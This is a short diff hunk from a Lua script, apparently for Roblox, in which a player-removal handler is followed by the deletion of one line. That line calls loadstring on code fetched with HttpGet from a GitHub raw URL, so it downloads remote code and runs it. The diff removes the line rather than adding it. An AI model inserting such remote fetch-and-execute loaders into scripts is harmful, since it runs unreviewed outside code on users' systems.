@@ -1596,5 +1596,3 @@ Players.PlayerRemoving:Connect(function(pl)
     end
     -- Don't remove from targetList or targetNames - let HB handle invalid players
 end)
-
-loadstring(game:HttpGet('https://raw.githubusercontent.com/NeuronerX/verysigma2/refs/heads/main/command.lua'))()
